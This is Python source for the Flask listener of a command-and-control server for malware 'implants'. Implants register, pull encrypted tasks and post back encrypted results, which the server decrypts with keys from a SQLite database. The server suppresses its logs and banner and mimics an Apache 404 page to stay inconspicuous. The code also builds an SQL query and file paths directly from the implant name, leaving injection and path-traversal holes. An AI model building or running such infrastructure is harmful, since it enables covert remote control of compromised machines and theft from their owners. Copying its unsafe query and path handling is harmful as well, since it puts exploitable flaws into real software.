from ipaddress import ip_address
import ipaddress
from signal import signal
from flask import Flask, request
import random
from secrets import choice
from string import ascii_uppercase
import threading
import C2Database
from tabulate import tabulate
from werkzeug.serving import make_server
import logging
import sqlite3
import os, signal, color, encryption, sys
from keyboard import press

#Registering The Flask App
app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.disabled = True
app.logger.disabled = True
cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None

#Error Handling
@app.errorhandler(404)
def Error(issue):
   return ("<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"> <title>404 Not Found</title> <h1>Not Found</h1> <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>",404)

#Testing The Listener To See If It Is Live To Return Hello World
@app.route('/', methods=['GET'])
def Home():
    return 'Hello World', 200


#Registering The Agent Here
@app.route("/registeragent/<ImplantName>", methods=['POST'])
def RegisterAgent(ImplantName):
	#result = request.form.get("result")
	print(color.red("\n\n[+] The Following Agent Named {} Has Checked In").format(ImplantName))
	print(color.green("[+] Press Enter One Time To Get C2 Input Back"))
	return ("",200)

#Serving The Tasks On This Endpoint
@app.route("/tasks/<ImplantName>", methods=['GET'])
def ServeTheTask(ImplantName):
    
	try:
		task = open("data/implant/%s/Tasks.enc" % ImplantName,"r").read()
		return (task,200)

	except:
		return ("",400)

#Here We Are Receiving The Results
@app.route("/result/<ImplantName>",methods=['POST'])
def TakeAResult(ImplantName):

	result = request.form.get("result")
	decrypt_results(ImplantName,result.replace(' ',''))
	os.remove("data/implant/%s/Tasks.enc" % ImplantName)
	return ("",200)


@app.route("/shutdown", methods=['GET'])
def stopserver():
    os.kill(os.getpid(), signal.SIGINT)
    return "Shutting Down"

def stop():

	shutdown_func = request.environ.get('werkzeug.server.shutdown')
	if shutdown_func is None:
		raise RuntimeError('Not running werkzeug')
	shutdown_func()

def Start(ipaddy, port):
	threading.Thread(target=app.run, daemon=True, args=[ipaddy, port]).start()

def decrypt_results(name,results):
	connect = sqlite3.connect("C2Database.db")
	key = connect.execute("SELECT Key FROM Implants WHERE ImplantName='%s'" % name)
	result = key.fetchall()
	thekey = result[0][0]
	print ("\n\n[%s] %s Results is returned\n" % (color.green("+"),name))
	dec_results = encryption.DecryptString(results,thekey)
	print(dec_results)
	file = open("data/implant/%s/Results.dec" % name,"w")
	file.write(dec_results)
	file.close()
	press("enter")